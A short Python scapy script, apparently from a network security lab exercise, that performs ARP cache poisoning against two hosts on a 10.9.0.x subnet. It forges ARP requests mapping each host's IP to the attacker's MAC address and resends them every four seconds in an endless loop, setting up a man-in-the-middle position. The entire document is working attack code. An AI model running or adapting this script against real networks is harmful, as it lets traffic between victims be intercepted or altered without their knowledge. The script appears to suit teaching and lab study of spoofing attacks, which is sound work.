#!/usr/bin/env python3
from scapy.all import *
from time import sleep

MMAC = "02:42:0a:09:00:69"
AMAC = "02:42:0a:09:00:05"
BMAC = "02:42:0a:09:00:06"
AIP = "10.9.0.5"
BIP = "10.9.0.6"

#Spoofing host A
ethA = Ether()
arpA = ARP()

ethA.src = MMAC 
ethA.dst = AMAC

arpA.op = 1 #op = 1 for arp request, op = 2 for arp reply
arpA.psrc = BIP
arpA.hwsrc = MMAC
arpA.pdst = AIP

packetA = ethA/arpA

#Spoofing host B
ethB = Ether()
arpB = ARP()

ethB.src = MMAC 
ethB.dst = BMAC

arpB.op = 1 #op = 1 for arp request, op = 2 for arp reply
arpB.psrc = AIP
arpB.hwsrc = MMAC
arpB.pdst = BIP

packetB = ethB/arpB

while 1:
	sendp(packetA)
	sendp(packetB)
	time.sleep(4)

